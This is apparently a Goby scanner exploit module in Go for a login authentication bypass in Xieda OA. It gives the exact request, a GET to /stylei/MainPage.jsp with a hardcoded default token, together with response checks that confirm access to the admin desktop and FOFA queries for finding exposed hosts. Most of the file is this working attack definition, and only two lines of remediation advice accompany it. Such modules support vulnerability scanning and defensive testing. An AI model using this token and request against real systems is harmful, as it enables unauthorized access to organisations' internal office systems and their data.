package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Xieda OA system bypasses login authentication",
    "Description": "<p>Xieda OA has a login authentication bypass vulnerability. Attackers use the default token to log in to the system background. </p>",
    "Impact": "Xieda OA system bypasses login authentication",
    "Recommendation": "<p>1. Pay attention to the patch released by the manufacturer: <a href=\"http://www.ctop.cn/\">http://www.ctop.cn/</a></p><p> 2. Delete the default token</p>",
    "Product": "Xieda OA System",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "协达OA系统绕过登录认证登陆后台",
            "Description": "<p>协达OA系统是一款全面先进的OA系统</p><p>协达 OA 存在登录认证绕过漏洞，攻击者利用默认的token登陆系统后台。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者利用默认的token登陆系统后台，获取敏感信息进一步控制服务器。</span><br></p>",
            "Recommendation": "<p>1、关注厂商发布补丁：<a href=\"http://www.ctop.cn/\">http://www.ctop.cn/</a></p><p>2、删除默认token</p>",
            "Product": "协达OA系统",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Xieda OA system bypasses login authentication",
            "Description": "<p>Xieda OA has a login authentication bypass vulnerability. Attackers use the default token to log in to the system background. <br></p>",
            "Impact": "Xieda OA system bypasses login authentication",
            "Recommendation": "<p>1. Pay attention to the patch released by the manufacturer: <a href=\"http://www.ctop.cn/\">http://www.ctop.cn/</a></p><p> 2. Delete the default token</p>",
            "Product": "Xieda OA System",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "body=\"/interface/CheckLoginName.jsp\"",
    "GobyQuery": "body=\"/interface/CheckLoginName.jsp\"",
    "Author": "learnupup@gmail.com",
    "Homepage": "http://www.ctop.cn/",
    "DisclosureDate": "2021-12-01",
    "References": [],
    "HasExp": false,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OA系统",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "我的桌面",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OA系统",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "我的桌面",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10253"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
